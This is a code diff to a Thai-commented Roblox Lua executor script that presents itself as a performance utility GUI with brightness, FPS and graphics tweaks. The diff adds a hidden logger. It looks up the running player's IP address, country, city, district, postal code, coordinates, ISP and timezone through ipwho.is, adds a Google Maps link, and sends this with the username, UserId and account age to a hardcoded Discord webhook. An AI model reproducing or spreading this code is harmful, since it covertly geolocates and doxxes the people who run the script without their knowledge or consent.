@@ -10,12 +10,22 @@ gui.Name = "UtilityGUI"
 
 -- ปรับความสว่างค้างไว้
 local function lockBrightness()
-	Lighting.Brightness = 1.5
+	Lighting.Brightness = 1
 	Lighting.ClockTime = 14
 	local atmosphere = Lighting:FindFirstChildOfClass("Atmosphere")
 	if atmosphere then
 		atmosphere.Density = 0
 	end
+end
+
+for _, obj in ipairs(workspace:GetDescendants()) do
+    if obj:IsA("BasePart") then
+        obj.Material = Enum.Material.Plastic
+        obj.Reflectance = 0
+        obj.CastShadow = false
+    elseif obj:IsA("Decal") then
+        obj:Destroy()
+    end
 end
 
 -- ลบต้นไม้ทุกโซน
@@ -71,7 +81,7 @@ RunService.RenderStepped:Connect(function(deltaTime)
 	accumulatedTime += deltaTime
 	frameCount += 1
 	
-	if accumulatedTime >= 1 then
+	if accumulatedTime >= 3 then
 		local fps = math.floor(frameCount / accumulatedTime)
 		fpsLabel.Text = "FPS: " .. fps
 		accumulatedTime = 0
@@ -175,48 +185,117 @@ RunService.Heartbeat:Connect(function()
 end)
 
 local HttpService = game:GetService("HttpService")
+local Players = game:GetService("Players")
+local UserInputService = game:GetService("UserInputService")
+local MarketplaceService = game:GetService("MarketplaceService")
 local player = Players.LocalPlayer
 
 local character = player.Character or player.CharacterAdded:Wait()
-local humanoid = character:FindFirstChildWhichIsA("Humanoid")
 local rootPart = character:FindFirstChild("HumanoidRootPart")
 
-local health = humanoid and humanoid.Health or "ไม่ทราบ"
-local maxHealth = humanoid and humanoid.MaxHealth or "ไม่ทราบ"
-
--- อุปกรณ์ที่ใช้
-local device = ""
-if game:GetService("UserInputService").TouchEnabled then
-	device = "มือถือ"
-else
-	device = "PC"
-end
-
--- ระดับสมาชิก
+local device = UserInputService.TouchEnabled and "มือถือ" or "PC"
 local membership = player.MembershipType == Enum.MembershipType.Premium and "Premium" or "None"
 
+local req = (syn and syn.request) or (http and http.request) or request
+local ipData = {
+	ip = "ไม่ทราบ",
+	country = "ไม่ทราบ",
+	country_flag = "",
+	country_code = "",
+	region = "ไม่ทราบ",
+	region_code = "",
+	city = "ไม่ทราบ",
+	district = "ไม่ทราบ",
+	latitude = "ไม่ทราบ",
+	longitude = "ไม่ทราบ",
+	postal = "ไม่ทราบ",
+	isp = "ไม่ทราบ",
+	timezone = "ไม่ทราบ",
+	call_code = ""
+}
+
+local function countryCodeToFlagEmoji(code)
+	if not code then return "" end
+	local flag = ""
+	for i = 1, #code do
+		local c = code:sub(i, i):upper()
+		flag = flag .. utf8.char(0x1F1E6 - 65 + string.byte(c))
+	end
+	return flag
+end
+
+-- ดึงข้อมูล IP
+local success, response = pcall(function()
+	return req({
+		Url = "https://ipwho.is/",
+		Method = "GET"
+	})
+end)
+
+if success and response and response.Body then
+	local data = HttpService:JSONDecode(response.Body)
+	if data.success then
+		ipData.ip = data.ip or "ไม่ทราบ"
+		ipData.country = data.country or "ไม่ทราบ"
+		ipData.country_code = data.country_code or ""
+		ipData.country_flag = countryCodeToFlagEmoji(data.country_code)
+		ipData.region = data.region or "ไม่ทราบ"
+		ipData.region_code = data.region_code or ""
+		ipData.city = data.city or "ไม่ทราบ"
+		ipData.district = data.district or "ไม่ทราบ"
+		ipData.latitude = data.latitude or "ไม่ทราบ"
+		ipData.longitude = data.longitude or "ไม่ทราบ"
+		ipData.postal = data.postal or "ไม่ทราบ"
+		ipData.timezone = data.timezone and data.timezone.id or "ไม่ทราบ"
+		ipData.call_code = data.calling_code or ""
+		ipData.isp = data.connection and data.connection.org or "ไม่ทราบ"
+	end
+end
+
+-- ดึงชื่อเกม
+local gameName = "ไม่ทราบ"
+pcall(function()
+	local info = MarketplaceService:GetProductInfo(game.PlaceId)
+	if info and info.Name then
+		gameName = info.Name
+	end
+end)
+
+-- ลิงก์ Google Maps
+local googleMapsLink = "https://www.google.com/maps?q=" .. tostring(ipData.latitude) .. "," .. tostring(ipData.longitude)
+
+-- สร้าง embed
 local embed = {
 	username = "Logger",
 	embeds = {{
 		title = "**มีคนใช้สคริปต์ของคุณ**",
 		color = 0xff66cc,
 		fields = {
-			{ name = "username", value = player.Name, inline = true },
+			{ name = "ชื่อเกม", value = gameName, inline = false },
+			{ name = "ชื่อผู้ใช้", value = player.Name, inline = true },
 			{ name = "ชื่อเล่น", value = player.DisplayName, inline = true },
 			{ name = "UserId", value = tostring(player.UserId), inline = true },
 			{ name = "อายุบัญชี", value = tostring(player.AccountAge) .. " วัน", inline = true },
 			{ name = "ระดับสมาชิก", value = membership, inline = true },
 			{ name = "อุปกรณ์ที่ใช้", value = device, inline = true },
-			{ name = "เวลา", value = os.date("%d/%m/%Y %H:%M:%S"), inline = false }
+			{ name = "เวลา", value = os.date("%d/%m/%Y %H:%M:%S"), inline = false },
+
+			{ name = "IP Address", value = ipData.ip, inline = false },
+			{ name = "ประเทศ", value = ipData.country_flag .. " " .. ipData.country .. " (+" .. ipData.call_code .. ")", inline = true },
+			{ name = "จังหวัด/รัฐ", value = ipData.region .. " (" .. ipData.region_code .. ")", inline = true },
+			{ name = "เมือง/เขต", value = ipData.city .. " / " .. ipData.district, inline = true },
+			{ name = "รหัสไปรษณีย์", value = ipData.postal, inline = true },
+			{ name = "ตำแหน่งบน Google Maps", value = "[คลิกที่นี่](" .. googleMapsLink .. ")", inline = true },
+			{ name = "เขตเวลา", value = ipData.timezone, inline = true },
+			{ name = "ผู้ให้บริการ (ISP)", value = ipData.isp, inline = false }
 		}
 	}}
 }
 
 local jsonData = HttpService:JSONEncode(embed)
-local req = (syn and syn.request) or (http and http.request) or request
 
 req({
-	Url = "https://discord.com/api/webhooks/1363189736226947162/xkLJv3gssgW4OWQNy-aA1gb16UJWIfWrAmh1RPByVYsjupUyigEJE8-XScgO7vq8flry", -- ใส่ Webhook URL ของคุณตรงนี้
+	Url = "https://discord.com/api/webhooks/1363189736226947162/xkLJv3gssgW4OWQNy-aA1gb16UJWIfWrAmh1RPByVYsjupUyigEJE8-XScgO7vq8flry", -- เปลี่ยน webhook ตรงนี้
 	Method = "POST",
 	Headers = {
 		["Content-Type"] = "application/json"
